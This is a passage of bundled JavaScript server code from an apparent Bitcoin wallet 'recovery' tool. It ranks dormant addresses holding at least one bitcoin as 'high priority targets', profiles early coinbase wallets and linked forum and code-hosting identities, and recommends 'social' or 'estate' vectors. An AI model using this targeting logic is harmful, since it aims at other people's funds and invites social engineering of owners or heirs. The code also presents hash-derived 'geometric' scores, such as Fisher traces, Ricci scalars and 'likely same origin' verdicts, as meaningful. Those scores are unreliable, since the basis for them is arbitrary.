  const uniqueSubstrates = new Set(signals.map((s) => s.type)).size;
  const diversityBonus = Math.min(0.3, uniqueSubstrates * 0.05);
  return Math.min(1, baseStrength + diversityBonus);
}
function estimateKappaFromSignals(signals) {
  let phiConstraints = 0;
  let hCreation = 4;
  for (const signal of signals) {
    switch (signal.type) {
      case "blockchain":
        if (signal.data.isEarlyEra) phiConstraints += 0.3;
        if (signal.data.isCoinbase) phiConstraints += 0.5;
        if (signal.data.isDormant) phiConstraints += 0.2;
        if (signal.data.temporalSignature?.likelyTimezones?.length) {
          phiConstraints += 0.2;
        }
        break;
      case "bitcointalk":
        phiConstraints += 0.4;
        hCreation -= 0.5;
        break;
      case "github":
      case "sourceforge":
        phiConstraints += 0.3;
        hCreation -= 0.3;
        break;
      case "cryptography_ml":
      case "bitcoin_ml":
        phiConstraints += 0.5;
        hCreation -= 0.5;
        break;
    }
  }
  phiConstraints = Math.min(1.5, phiConstraints);
  hCreation = Math.max(0.5, hCreation);
  return phiConstraints / hCreation;
}
async function analyzeGeometricIntersection(address) {
  const [blockchainSignals, entitySignals, artifactSignals] = await Promise.all([
    gatherBlockchainSignals(address),
    gatherEntitySignals(address),
    gatherArtifactSignals(address)
  ]);
  const allSignals = [...blockchainSignals, ...entitySignals, ...artifactSignals];
  const uniqueSubstrates = Array.from(new Set(allSignals.map((s) => s.type)));
  const intersectionStrength = computeIntersectionStrength(allSignals);
  const temporalCoherence = computeTemporalCoherence(allSignals);
  const entityOverlap = entitySignals.length > 0 ? Math.min(1, entitySignals.length / 3) : 0;
  const artifactDensity = artifactSignals.length > 0 ? Math.min(1, artifactSignals.length / 5) : 0;
  const kappaEstimate = estimateKappaFromSignals(allSignals);
  const confidence = 0.35 * intersectionStrength + 0.2 * temporalCoherence + 0.2 * entityOverlap + 0.15 * artifactDensity + 0.1 * Math.min(1, kappaEstimate);
  return {
    address,
    substrates: uniqueSubstrates,
    signalCount: allSignals.length,
    intersectionStrength,
    temporalCoherence,
    entityOverlap,
    artifactDensity,
    kappaEstimate,
    confidence,
    signals: allSignals
  };
}
async function findHighPriorityTargets(limit = 20) {
  const dormantAddresses = await observerStorage.getDormantAddresses({
    limit: 100,
    minBalance: 1e8
    // At least 1 BTC
  });
  const intersections = [];
  for (const addr of dormantAddresses) {
    const intersection = await analyzeGeometricIntersection(addr.address);
    intersections.push(intersection);
  }
  return intersections.sort((a, b) => b.confidence - a.confidence).slice(0, limit);
}
async function enrichWithSubstrateData(priority) {
  const intersection = await analyzeGeometricIntersection(priority.address);
  const enrichedConstraints = {
    ...priority.constraints,
    substrateCount: intersection.substrates.length,
    signalDensity: intersection.signalCount,
    temporalCoherence: intersection.temporalCoherence,
    entityLinkage: intersection.entityOverlap,
    artifactDensity: intersection.artifactDensity,
    multiSubstrateKappa: intersection.kappaEstimate
  };
  return {
    priority,
    intersection,
    enrichedConstraints
  };
}
function generateSubstrateReport(intersection) {
  const lines = [];
  lines.push(`=== Multi-Substrate Geometric Analysis ===`);
  lines.push(`Address: ${intersection.address}`);
  lines.push(`Substrates: ${intersection.substrates.join(", ")}`);
  lines.push(`Signal Count: ${intersection.signalCount}`);
  lines.push(``);
  lines.push(`Metrics:`);
  lines.push(`  Intersection Strength: ${(intersection.intersectionStrength * 100).toFixed(1)}%`);
  lines.push(`  Temporal Coherence: ${(intersection.temporalCoherence * 100).toFixed(1)}%`);
  lines.push(`  Entity Overlap: ${(intersection.entityOverlap * 100).toFixed(1)}%`);
  lines.push(`  Artifact Density: ${(intersection.artifactDensity * 100).toFixed(1)}%`);
  lines.push(`  Estimated \u03BA_recovery: ${intersection.kappaEstimate.toFixed(3)}`);
  lines.push(`  Overall Confidence: ${(intersection.confidence * 100).toFixed(1)}%`);
  lines.push(``);
  lines.push(`Signal Details:`);
  for (const signal of intersection.signals) {
    lines.push(`  [${signal.type}] conf=${(signal.confidence * 100).toFixed(0)}% weight=${signal.geometricWeight.toFixed(2)}`);
    if (signal.entity) lines.push(`    Entity: ${signal.entity}`);
    if (signal.timestamp) lines.push(`    Time: ${signal.timestamp.toISOString()}`);
  }
  return lines.join("\n");
}
var init_multi_substrate_integrator = __esm({
  "server/multi-substrate-integrator.ts"() {
    "use strict";
    init_observer_storage();
  }
});

// server/qig-basin-matching.ts
var qig_basin_matching_exports = {};
__export(qig_basin_matching_exports, {
  areBasinsSimilar: () => areBasinsSimilar,
  clusterByBasin: () => clusterByBasin,
  computeBasinDistance: () => computeBasinDistance,
  computeBasinSignature: () => computeBasinSignature,
  findSimilarBasins: () => findSimilarBasins,
  getClusterStats: () => getClusterStats
});
import { createHash as createHash5 } from "crypto";
function computeBasinSignature(address) {
  const hash = createHash5("sha256").update(address).digest();
  const basinCoordinates = Array.from(hash);
  const qigScore = scoreUniversalQIG(address, "arbitrary");
  let fisherTrace = 0;
  for (let i = 0; i < 32; i++) {
    const p = basinCoordinates[i] / 256 + 1e-3;
    fisherTrace += 1 / (p * (1 - p));
  }
  fisherTrace /= 32;
  const ricciScalar = qigScore.beta * fisherTrace / 10;
  return {
    address,
    phi: qigScore.phi,
    kappa: qigScore.kappa,
    beta: qigScore.beta,
    regime: qigScore.regime,
    patternScore: qigScore.patternScore,
    basinCoordinates,
    fisherTrace,
    ricciScalar
  };
}
function computeBasinDistance(sig1, sig2) {
  const kappaDist = Math.abs(sig1.kappa - sig2.kappa) / 64;
  const phiDist = Math.abs(sig1.phi - sig2.phi);
  const patternDist = Math.abs(sig1.patternScore - sig2.patternScore);
  const coord1Str = sig1.basinCoordinates.map((b) => String.fromCharCode(48 + b % 74)).join("");
  const coord2Str = sig2.basinCoordinates.map((b) => String.fromCharCode(48 + b % 74)).join("");
  const fisherDist = fisherDistance(coord1Str, coord2Str);
  const totalDistance = 0.3 * kappaDist + 0.25 * phiDist + 0.25 * fisherDist + 0.2 * patternDist;
  return {
    fisherDist,
    kappaDist,
    phiDist,
    patternDist,
    totalDistance
  };
}
function areBasinsSimilar(sig1, sig2, strictMode = false) {
  const distances = computeBasinDistance(sig1, sig2);
  if (strictMode) {
    return distances.kappaDist * QIG_CONSTANTS.KAPPA_STAR < KAPPA_TOLERANCE / 2 && distances.phiDist < PHI_TOLERANCE / 2 && distances.fisherDist < FISHER_THRESHOLD / 2 && sig1.regime === sig2.regime;
  }
  return distances.totalDistance < 0.3;
}
function findSimilarBasins(targetSignature, candidateSignatures, topK = 10) {
  const matches = [];
  for (const candidate of candidateSignatures) {
    if (candidate.address === targetSignature.address) continue;
    const distances = computeBasinDistance(targetSignature, candidate);
    const similarity = 1 - Math.min(1, distances.totalDistance);
    const patternSimilarity = 1 - distances.patternDist;
    let confidence = similarity;
    if (candidate.regime === targetSignature.regime) {
      confidence *= 1.2;
    }
    const bothNearKappaStar = Math.abs(candidate.kappa - 64) < 10 && Math.abs(targetSignature.kappa - 64) < 10;
    if (bothNearKappaStar) {
      confidence *= 1.15;
    }
    confidence = Math.min(1, confidence);
    let explanation = "";
    if (similarity > 0.8) {
      explanation = "Very high geometric similarity - likely same origin";
    } else if (similarity > 0.6) {
      explanation = "High geometric similarity - possible same origin";
    } else if (similarity > 0.4) {
      explanation = "Moderate similarity - may share some characteristics";
    } else {
      explanation = "Low similarity - unlikely to be related";
    }
    if (candidate.regime === targetSignature.regime) {
      explanation += ` (same ${candidate.regime} regime)`;
    }
    matches.push({
      candidateAddress: candidate.address,
      targetAddress: targetSignature.address,
      similarity,
      kappaDistance: distances.kappaDist * 64,
      phiDistance: distances.phiDist,
      fisherDistance: distances.fisherDist,
      patternSimilarity,
      regimeMatch: candidate.regime === targetSignature.regime,
      confidence,
      explanation
    });
  }
  return matches.sort((a, b) => b.similarity - a.similarity).slice(0, topK);
}
function clusterByBasin(signatures, epsilon = 0.3, minPoints = 2) {
  const clusters = /* @__PURE__ */ new Map();
  const visited = /* @__PURE__ */ new Set();
  const clusterAssignment = /* @__PURE__ */ new Map();
  let currentCluster = 0;
  for (const sig of signatures) {
    if (visited.has(sig.address)) continue;
    visited.add(sig.address);
    const neighbors = signatures.filter((other) => {
      if (other.address === sig.address) return false;
      const dist = computeBasinDistance(sig, other);
      return dist.totalDistance < epsilon;
    });
    if (neighbors.length < minPoints - 1) {
      continue;
    }
    currentCluster++;
    clusters.set(currentCluster, [sig]);
    clusterAssignment.set(sig.address, currentCluster);
    const queue = [...neighbors];
    while (queue.length > 0) {
      const neighbor = queue.shift();
      if (!visited.has(neighbor.address)) {
        visited.add(neighbor.address);
        const neighborNeighbors = signatures.filter((other) => {
          if (other.address === neighbor.address) return false;
          const dist = computeBasinDistance(neighbor, other);
          return dist.totalDistance < epsilon;
        });
        if (neighborNeighbors.length >= minPoints - 1) {
          for (const nn of neighborNeighbors) {
            if (!visited.has(nn.address)) {
              queue.push(nn);
            }
          }
        }
      }
      if (!clusterAssignment.has(neighbor.address)) {
        clusterAssignment.set(neighbor.address, currentCluster);
        clusters.get(currentCluster).push(neighbor);
      }
    }
  }
  return clusters;
}
function getClusterStats(cluster) {
  if (cluster.length === 0) {
    return {
      centroidPhi: 0,
      centroidKappa: 0,
      phiVariance: 0,
      kappaVariance: 0,
      dominantRegime: "unknown",
      avgPatternScore: 0,
      cohesion: 0
    };
  }
  const centroidPhi = cluster.reduce((sum, s) => sum + s.phi, 0) / cluster.length;
  const centroidKappa = cluster.reduce((sum, s) => sum + s.kappa, 0) / cluster.length;
  const avgPatternScore = cluster.reduce((sum, s) => sum + s.patternScore, 0) / cluster.length;
  const phiVariance = cluster.reduce((sum, s) => sum + (s.phi - centroidPhi) ** 2, 0) / cluster.length;
  const kappaVariance = cluster.reduce((sum, s) => sum + (s.kappa - centroidKappa) ** 2, 0) / cluster.length;
  const regimeCounts = {};
  for (const sig of cluster) {
    regimeCounts[sig.regime] = (regimeCounts[sig.regime] || 0) + 1;
  }
  const dominantRegime = Object.entries(regimeCounts).sort((a, b) => b[1] - a[1])[0][0];
  let totalDistance = 0;
  let pairCount = 0;
  for (let i = 0; i < cluster.length; i++) {
    for (let j = i + 1; j < cluster.length; j++) {
      const dist = computeBasinDistance(cluster[i], cluster[j]);
      totalDistance += dist.totalDistance;
      pairCount++;
    }
  }
  const avgDistance = pairCount > 0 ? totalDistance / pairCount : 0;
  const cohesion = 1 - Math.min(1, avgDistance);
  return {
    centroidPhi,
    centroidKappa,
    phiVariance,
    kappaVariance,
    dominantRegime,
    avgPatternScore,
    cohesion
  };
}
var KAPPA_TOLERANCE, PHI_TOLERANCE, FISHER_THRESHOLD;
var init_qig_basin_matching = __esm({
  "server/qig-basin-matching.ts"() {
    "use strict";
    init_qig_universal();
    init_qig_pure_v2();
    init_physics_constants();
    KAPPA_TOLERANCE = 8;
    PHI_TOLERANCE = 0.15;
    FISHER_THRESHOLD = 0.5;
  }
});

// server/qig-confidence.ts
var qig_confidence_exports = {};
__export(qig_confidence_exports, {
  addSample: () => addSample,
  computeConfidence: () => computeConfidence,
  computeRecoveryConfidence: () => computeRecoveryConfidence,
  detectConfidenceTrend: () => detectConfidenceTrend,
  estimateSingleSampleConfidence: () => estimateSingleSampleConfidence,
  initStabilityTracker: () => initStabilityTracker
});
function initStabilityTracker() {
  return {
    phiHistory: [],
    kappaHistory: [],
    regimeHistory: [],
    basinHistory: [],
    timestamps: []
  };
}
function addSample(tracker, score, basinCoordinates) {
  tracker.phiHistory.push(score.phi);
  tracker.kappaHistory.push(score.kappa);
  tracker.regimeHistory.push(score.regime);
  tracker.basinHistory.push([...basinCoordinates]);
  tracker.timestamps.push(Date.now());
  const maxSamples = 100;
  if (tracker.phiHistory.length > maxSamples) {
    tracker.phiHistory = tracker.phiHistory.slice(-maxSamples);
    tracker.kappaHistory = tracker.kappaHistory.slice(-maxSamples);
    tracker.regimeHistory = tracker.regimeHistory.slice(-maxSamples);
    tracker.basinHistory = tracker.basinHistory.slice(-maxSamples);
    tracker.timestamps = tracker.timestamps.slice(-maxSamples);
  }
}
function computeVariance(values) {
  if (values.length === 0) return 0;
  const mean = values.reduce((a, b) => a + b, 0) / values.length;
  return values.reduce((sum, v) => sum + (v - mean) ** 2, 0) / values.length;
}
function computeMode(values) {
  const counts = {};
  for (const v of values) {
    counts[v] = (counts[v] || 0) + 1;
  }
  const sorted = Object.entries(counts).sort((a, b) => b[1] - a[1]);
  return {
    mode: sorted[0]?.[0] || "unknown",
    frequency: (sorted[0]?.[1] || 0) / values.length
  };
}
function computeBasinSpread(basins) {
  if (basins.length === 0) return 0;
  const centroid = new Array(32).fill(0);
  for (const basin of basins) {
    for (let i = 0; i < 32; i++) {
      centroid[i] += basin[i] / basins.length;
    }
  }
  let totalDist = 0;
  for (const basin of basins) {
    let dist = 0;
    for (let i = 0; i < 32; i++) {
      dist += (basin[i] - centroid[i]) ** 2;
    }
    totalDist += Math.sqrt(dist);
  }
  const maxDist = Math.sqrt(32 * 255 * 255);
  return totalDist / (basins.length * maxDist);
}
function computeConfidence(tracker) {
  const sampleSize = tracker.phiHistory.length;
  if (sampleSize < 3) {
    return {
      overall: 0.5,
      phiConfidence: 0.5,
      kappaConfidence: 0.5,
      regimeConfidence: 0.5,
      basinStability: 0.5,
      sampleSize,
      explanation: "Insufficient samples for reliable confidence estimation"
    };
  }
  const phiVariance = computeVariance(tracker.phiHistory);
  const phiConfidence = Math.max(0, 1 - phiVariance / VARIANCE_THRESHOLD_MED);
  const kappaVariance = computeVariance(tracker.kappaHistory);
  const kappaNormVariance = kappaVariance / (64 * 64);
  const kappaConfidence = Math.max(0, 1 - kappaNormVariance * 10);
  const { mode, frequency } = computeMode(tracker.regimeHistory);
  const regimeConfidence = frequency;
  const basinSpread = computeBasinSpread(tracker.basinHistory);
  const basinStability = Math.max(0, 1 - basinSpread * 5);
  const overall = 0.3 * phiConfidence + 0.3 * kappaConfidence + 0.2 * regimeConfidence + 0.2 * basinStability;
  let explanation = "";
  if (overall > 0.8) {
    explanation = `High confidence: metrics stable across ${sampleSize} samples`;
  } else if (overall > 0.6) {
    explanation = `Moderate confidence: some variation observed`;
  } else if (overall > 0.4) {
    explanation = `Low confidence: significant metric variance`;
  } else {
    explanation = `Very low confidence: unstable measurements`;
  }
  const warnings = [];
  if (phiConfidence < 0.5) warnings.push("\u03A6 unstable");
  if (kappaConfidence < 0.5) warnings.push("\u03BA unstable");
  if (regimeConfidence < 0.7) warnings.push(`regime fluctuating (${mode} ${(frequency * 100).toFixed(0)}%)`);
  if (warnings.length > 0) {
    explanation += ` | Warnings: ${warnings.join(", ")}`;
  }
  return {
    overall,
    phiConfidence,
    kappaConfidence,
    regimeConfidence,
    basinStability,
    sampleSize,
    explanation
  };
}
function estimateSingleSampleConfidence(score) {
  const phiConfidence = score.phi;
  const kappaDist = Math.abs(score.kappa - 64) / 64;
  const kappaConfidence = 1 - kappaDist;
  let regimeConfidence;
  switch (score.regime) {
    case "geometric":
      regimeConfidence = 0.9;
      break;
    case "linear":
      regimeConfidence = 0.7;
      break;
    case "breakdown":
      regimeConfidence = 0.5;
      break;
    default:
      regimeConfidence = 0.5;
  }
  const basinStability = 0.5 + 0.5 * score.patternScore;
  const overall = 0.3 * phiConfidence + 0.3 * kappaConfidence + 0.2 * regimeConfidence + 0.2 * basinStability;
  let explanation = "";
  if (overall > 0.7) {
    explanation = `High confidence estimate (single sample, ${score.regime} regime)`;
  } else if (overall > 0.5) {
    explanation = `Moderate confidence estimate (need more samples)`;
  } else {
    explanation = `Low confidence estimate (unstable metrics)`;
  }
  if (score.inResonance) {
    explanation += " | In resonance zone (\u03BA \u2248 \u03BA*)";
  }
  return {
    overall,
    phiConfidence,
    kappaConfidence,
    regimeConfidence,
    basinStability,
    sampleSize: 1,
    explanation
  };
}
function computeRecoveryConfidence(kappaRecovery, phiConstraints, hCreation, entityCount, artifactCount, isDormant, dormancyYears) {
  const factors = {};
  factors.kappaRecovery = Math.min(1, kappaRecovery);
  factors.constraintDensity = Math.min(1, phiConstraints);
  factors.creationEntropy = Math.max(0, 1 - hCreation / 8);
  factors.entityLinkage = Math.min(1, entityCount / 5);
  factors.artifactAvailability = Math.min(1, artifactCount / 10);
  factors.dormancyStrength = isDormant ? Math.min(1, dormancyYears / 10) : 0;
  const confidence = 0.25 * factors.kappaRecovery + 0.2 * factors.constraintDensity + 0.15 * factors.creationEntropy + 0.15 * factors.entityLinkage + 0.1 * factors.artifactAvailability + 0.15 * factors.dormancyStrength;
  let recommendation;
  if (confidence > 0.7) {
    recommendation = "HIGH PRIORITY: Strong recovery indicators. Proceed with all vectors.";
  } else if (confidence > 0.5) {
    recommendation = "MEDIUM PRIORITY: Moderate indicators. Focus on constrained search and social vectors.";
  } else if (confidence > 0.3) {
    recommendation = "LOW PRIORITY: Weak indicators. Estate vector may be most viable.";
  } else {
    recommendation = "VERY LOW PRIORITY: Insufficient indicators. Consider deprioritizing.";
  }
  return {
    confidence,
    factors,
    recommendation
  };
}
function detectConfidenceTrend(confidenceHistory, windowSize = 10) {
  if (confidenceHistory.length < 3) {
    return { trend: "stable", slope: 0, volatility: 0 };
  }
  const recent = confidenceHistory.slice(-windowSize);
  const n = recent.length;
  const xMean = (n - 1) / 2;
  const yMean = recent.reduce((a, b) => a + b, 0) / n;
  let numerator = 0;
  let denominator = 0;
  for (let i = 0; i < n; i++) {
    numerator += (i - xMean) * (recent[i] - yMean);
    denominator += (i - xMean) ** 2;
  }
  const slope = denominator !== 0 ? numerator / denominator : 0;
  const volatility = Math.sqrt(computeVariance(recent));
  let trend;
  if (Math.abs(slope) < 0.01) {
    trend = "stable";
  } else if (slope > 0) {
    trend = "improving";
  } else {
    trend = "declining";
  }
  return { trend, slope, volatility };
}
var VARIANCE_THRESHOLD_MED;
var init_qig_confidence = __esm({
  "server/qig-confidence.ts"() {
    "use strict";
    VARIANCE_THRESHOLD_MED = 0.15;
  }
});

// server/ocean/fisher-analysis.ts
function symmetricEigendecomposition(matrix) {
  const n = matrix.length;
  if (n === 0) return { eigenvalues: [], eigenvectors: [] };
  const A = matrix.map((row) => [...row]);
  const V = [];
  for (let i = 0; i < n; i++) {
    V[i] = new Array(n).fill(0);
    V[i][i] = 1;
  }
  const maxIterations = 100;
  const tolerance = 1e-10;
  for (let iter = 0; iter < maxIterations; iter++) {
    let maxOffDiag = 0;
    let p = 0, q = 1;
    for (let i = 0; i < n; i++) {
      for (let j = i + 1; j < n; j++) {
        if (Math.abs(A[i][j]) > maxOffDiag) {
          maxOffDiag = Math.abs(A[i][j]);
          p = i;
          q = j;
        }
      }
    }
    if (maxOffDiag < tolerance) break;
    const theta = (A[q][q] - A[p][p]) / (2 * A[p][q]);
    const t = Math.sign(theta) / (Math.abs(theta) + Math.sqrt(theta * theta + 1));
    const c = 1 / Math.sqrt(1 + t * t);
    const s = t * c;
    const App = A[p][p], Aqq = A[q][q], Apq = A[p][q];
    A[p][p] = c * c * App - 2 * s * c * Apq + s * s * Aqq;
    A[q][q] = s * s * App + 2 * s * c * Apq + c * c * Aqq;
    A[p][q] = 0;
    A[q][p] = 0;
    for (let i = 0; i < n; i++) {
      if (i !== p && i !== q) {
        const Aip = A[i][p], Aiq = A[i][q];
        A[i][p] = c * Aip - s * Aiq;
        A[p][i] = A[i][p];
        A[i][q] = s * Aip + c * Aiq;
        A[q][i] = A[i][q];
      }
    }
    for (let i = 0; i < n; i++) {
      const Vip = V[i][p], Viq = V[i][q];
      V[i][p] = c * Vip - s * Viq;
      V[i][q] = s * Vip + c * Viq;
    }
  }
  const eigenvalues = A.map((row, i) => row[i]);
  const indices = eigenvalues.map((_, i) => i);
  indices.sort((a, b) => Math.abs(eigenvalues[b]) - Math.abs(eigenvalues[a]));
  const sortedEigenvalues = indices.map((i) => eigenvalues[i]);
  const sortedEigenvectors = [];
  for (let i = 0; i < n; i++) {
    sortedEigenvectors[i] = indices.map((j) => V[i][j]);
  }
  return { eigenvalues: sortedEigenvalues, eigenvectors: sortedEigenvectors };
}
function lanczosEigendecomposition(matrix, k) {
  const n = matrix.length;
  if (n === 0) return { eigenvalues: [], eigenvectors: [] };
  const numLanczosVectors = Math.min(k + 10, n);
  const T = [];
  for (let i = 0; i < numLanczosVectors; i++) {
    T[i] = new Array(numLanczosVectors).fill(0);
  }
  const V = [];
  let v = Array.from({ length: n }, () => Math.random() - 0.5);
  let norm = Math.sqrt(v.reduce((s, x) => s + x * x, 0));
  v = v.map((x) => x / norm);
  V.push(v);
  let vPrev = new Array(n).fill(0);
  let beta = 0;
  for (let j = 0; j < numLanczosVectors; j++) {
    const w = new Array(n).fill(0);
    for (let i = 0; i < n; i++) {
      for (let l = 0; l < n; l++) {
        w[i] += matrix[i][l] * v[l];
      }
    }
    const alpha = w.reduce((s, x, i) => s + x * v[i], 0);
    T[j][j] = alpha;
    for (let i = 0; i < n; i++) {
      w[i] = w[i] - alpha * v[i] - beta * vPrev[i];
    }
    beta = Math.sqrt(w.reduce((s, x) => s + x * x, 0));
    if (beta < 1e-10 || j === numLanczosVectors - 1) break;
    T[j][j + 1] = beta;
    T[j + 1][j] = beta;
    vPrev = v;
    v = w.map((x) => x / beta);
    V.push(v);
  }
  const actualSize = V.length;
  const Tsub = T.slice(0, actualSize).map((row) => row.slice(0, actualSize));
  const { eigenvalues: tEigenvalues, eigenvectors: tEigenvectors } = symmetricEigendecomposition(Tsub);
  const eigenvalues = tEigenvalues.slice(0, k);
  const eigenvectors = [];
  for (let i = 0; i < n; i++) {
    eigenvectors[i] = new Array(k).fill(0);
    for (let j = 0; j < k; j++) {
      for (let l = 0; l < actualSize; l++) {
        eigenvectors[i][j] += (V[l]?.[i] || 0) * (tEigenvectors[l]?.[j] || 0);
      }
    }
  }
  return { eigenvalues, eigenvectors };
}
function computeFisherInformationMatrix2(probes, dimensions = 32) {
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  if (withCoords.length < 10) {
    return {
      matrix: [],
      eigenvalues: [],
      eigenvectors: [],
      exploredDimensions: [],
      unexploredDimensions: Array.from({ length: dimensions }, (_, i) => i),
      effectiveRank: 0,
      covarianceMeans: []
    };
  }
  const dims = Math.min(withCoords[0].coordinates.length, dimensions);
  const means = new Array(dims).fill(0);
  for (const probe of withCoords) {
    for (let d = 0; d < dims; d++) {
      means[d] += probe.coordinates[d] || 0;
    }
  }
  for (let d = 0; d < dims; d++) {
    means[d] /= withCoords.length;
  }
  const covariance = [];
  for (let i = 0; i < dims; i++) {
    covariance[i] = new Array(dims).fill(0);
    for (let j = 0; j <= i; j++) {
      let sum = 0;
      for (const probe of withCoords) {
        const ci = (probe.coordinates[i] || 0) - means[i];
        const cj = (probe.coordinates[j] || 0) - means[j];
        sum += ci * cj;
      }
      const cov = sum / (withCoords.length - 1);
      covariance[i][j] = cov;
      covariance[j][i] = cov;
    }
  }
  const useLanczos = dims > 20;
  const { eigenvalues: covEigenvalues, eigenvectors: covEigenvectors } = useLanczos ? lanczosEigendecomposition(covariance, 12) : symmetricEigendecomposition(covariance);
  const epsilon = 0.01;
  const fisherEigenvalues = covEigenvalues.map(
    (lambda) => 1 / (Math.abs(lambda) + epsilon)
  );
  const fisher = [];
  for (let i = 0; i < dims; i++) {
    fisher[i] = new Array(dims).fill(0);
    for (let j = 0; j < dims; j++) {
      let sum = 0;
      for (let k = 0; k < dims; k++) {
        sum += covEigenvectors[i][k] * fisherEigenvalues[k] * covEigenvectors[j][k];
      }
      fisher[i][j] = sum;
    }
  }
  const maxEigenvalue = Math.max(...covEigenvalues.map(Math.abs));
  const threshold = maxEigenvalue * 0.02;
  const exploredDimensions = [];
  const unexploredDimensions = [];
  for (let i = 0; i < covEigenvalues.length; i++) {
    if (Math.abs(covEigenvalues[i]) >= threshold) {
      exploredDimensions.push(i);
    } else {
      unexploredDimensions.push(i);
    }
  }
  const effectiveRank = exploredDimensions.length;
  console.log(`[FisherAnalysis] Fisher analysis: ${effectiveRank}/${dims} dimensions explored`);
  console.log(`[FisherAnalysis] Max eigenvalue: ${maxEigenvalue.toFixed(4)}, threshold: ${threshold.toFixed(4)}`);
  return {
    matrix: fisher,
    eigenvalues: fisherEigenvalues,
    eigenvectors: covEigenvectors,
    exploredDimensions,
    unexploredDimensions,
    effectiveRank,
    covarianceMeans: means
  };
}
function computeMahalanobisDistance(coords, fisherMatrix, means) {
  if (fisherMatrix.length === 0 || coords.length === 0) return 0;
  const dims = Math.min(coords.length, fisherMatrix.length);
  const diff = coords.slice(0, dims).map((c, i) => c - (means[i] || 0));
  let mahalanobis = 0;
  for (let i = 0; i < dims; i++) {
    for (let j = 0; j < dims; j++) {
      mahalanobis += diff[i] * (fisherMatrix[i]?.[j] || 0) * diff[j];
    }
  }
  return Math.sqrt(Math.max(0, mahalanobis));
}
var init_fisher_analysis = __esm({
  "server/ocean/fisher-analysis.ts"() {
    "use strict";
  }
});

// server/ocean/basin-topology.ts
function computeAttractorPoint(probes, defaultDims = 64) {
  if (probes.length === 0) {
    return new Array(defaultDims).fill(0);
  }
  const highPhiProbes = probes.filter((p) => p.phi >= 0.5 && p.coordinates.length > 0);
  if (highPhiProbes.length === 0) {
    const withCoords = probes.filter((p) => p.coordinates.length > 0);
    if (withCoords.length === 0) return new Array(defaultDims).fill(0);
    const dims2 = withCoords[0].coordinates.length;
    const attractor2 = new Array(dims2).fill(0);
    for (const probe of withCoords) {
      for (let i = 0; i < dims2; i++) {
        attractor2[i] += probe.coordinates[i] / withCoords.length;
      }
    }
    return attractor2;
  }
  const dims = highPhiProbes[0].coordinates.length;
  const attractor = new Array(dims).fill(0);
  let totalWeight = 0;
  for (const probe of highPhiProbes) {
    const weight = probe.phi;
    totalWeight += weight;
    for (let i = 0; i < dims; i++) {
      attractor[i] += probe.coordinates[i] * weight;
    }
  }
  for (let i = 0; i < dims; i++) {
    attractor[i] /= totalWeight;
  }
  return attractor;
}
function computeBasinVolume(probes) {
  if (probes.length < 2) return 0;
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  if (withCoords.length < 2) return 0;
  const dims = Math.min(withCoords[0].coordinates.length, 16);
  let logVolume = 0;
  for (let d = 0; d < dims; d++) {
    let minVal = Infinity;
    let maxVal = -Infinity;
    for (const p of withCoords) {
      const val = p.coordinates[d] || 0;
      if (val < minVal) minVal = val;
      if (val > maxVal) maxVal = val;
    }
    const range = maxVal - minVal;
    logVolume += Math.log(Math.max(range, 1e-3));
  }
  return Math.min(1, Math.exp(logVolume / dims) / 10);
}
function computeLocalCurvature(probes) {
  if (probes.length < 3) return new Array(16).fill(0);
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  if (withCoords.length < 3) return new Array(16).fill(0);
  const dims = Math.min(withCoords[0].coordinates.length, 16);
  const curvature = new Array(dims).fill(0);
  for (let d = 0; d < dims; d++) {
    const sorted = [...withCoords].sort(
      (a, b) => (a.coordinates[d] || 0) - (b.coordinates[d] || 0)
    );
    let curvSum = 0;
    for (let i = 1; i < sorted.length - 1; i++) {
      const phiPrev = sorted[i - 1].phi;
      const phiCurr = sorted[i].phi;
      const phiNext = sorted[i + 1].phi;
      curvSum += Math.abs(phiNext - 2 * phiCurr + phiPrev);
    }
    curvature[d] = curvSum / Math.max(1, sorted.length - 2);
  }
  return curvature;
}
function computeBoundaryDistances(probes, attractor) {
  if (probes.length < 2) return new Array(16).fill(1);
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  if (withCoords.length < 2) return new Array(16).fill(1);
  const dims = Math.min(attractor.length, 16);
  const distances = new Array(dims).fill(0);
  for (let d = 0; d < dims; d++) {
    const center = attractor[d];
    let minVal = Infinity;
    let maxVal = -Infinity;
    for (const p of withCoords) {
      const val = p.coordinates[d] || 0;
      if (val < minVal) minVal = val;
      if (val > maxVal) maxVal = val;
    }
    distances[d] = Math.max(
      Math.abs(maxVal - center),
      Math.abs(minVal - center)
    );
  }
  return distances;
}
function findResonanceShells(probes, attractor) {
  const shells = [];
  const probesWithDistance = probes.filter((p) => p.coordinates.length > 0).map((p) => ({
    probe: p,
    distance: fisherCoordDistance(p.coordinates, attractor)
  })).sort((a, b) => a.distance - b.distance);
  if (probesWithDistance.length < 5) return shells;
  const shellWidth = 0.5;
  let currentRadius = 0;
  while (currentRadius < 10) {
    const inShell = probesWithDistance.filter(
      (pd) => pd.distance >= currentRadius && pd.distance < currentRadius + shellWidth
    );
    if (inShell.length >= 3) {
      const avgPhi = inShell.reduce((sum, pd) => sum + pd.probe.phi, 0) / inShell.length;
      if (avgPhi >= 0.5) {
        const regimes = {};
        for (const pd of inShell) {
          regimes[pd.probe.regime] = (regimes[pd.probe.regime] || 0) + 1;
        }
        const dominantRegime = Object.entries(regimes).sort((a, b) => b[1] - a[1])[0]?.[0] || "linear";
        shells.push({
          radius: currentRadius + shellWidth / 2,
          avgPhi,
          thickness: shellWidth,
          dominantRegime
        });
      }
    }
    currentRadius += shellWidth;
  }
  return shells;
}
function computeFlowField(probes, attractor) {
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  const dims = Math.min(attractor.length, 16);
  const gradientDirection = new Array(dims).fill(0);
  if (withCoords.length >= 2) {
    const sorted = [...withCoords].sort((a, b) => b.phi - a.phi);
    const topProbes = sorted.slice(0, Math.min(5, sorted.length));
    for (let d = 0; d < dims; d++) {
      const avgTop = topProbes.reduce((sum, p) => sum + (p.coordinates[d] || 0), 0) / topProbes.length;
      gradientDirection[d] = avgTop - attractor[d];
    }
    const magnitude = Math.sqrt(gradientDirection.reduce((sum, g) => sum + g * g, 0));
    if (magnitude > 1e-3) {
      for (let d = 0; d < dims; d++) {
        gradientDirection[d] /= magnitude;
      }
    }
  }
  const fisherMetric = [];
  for (let i = 0; i < Math.min(dims, 8); i++) {
    const row = new Array(Math.min(dims, 8)).fill(0);
    const values = withCoords.map((p) => p.coordinates[i] || 0);
